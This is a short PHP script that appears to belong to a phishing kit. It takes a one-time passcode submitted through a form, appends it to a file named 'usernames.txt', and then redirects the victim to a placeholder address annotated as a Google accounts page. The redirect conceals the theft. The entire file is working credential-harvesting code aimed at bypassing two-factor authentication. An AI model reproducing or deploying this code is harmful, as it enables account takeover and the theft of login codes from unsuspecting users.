<?php
file_put_contents("usernames.txt", "OTP: " . $_POST['OTP'] . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://accounts.google.com
header("Location: $url");
exit();
?>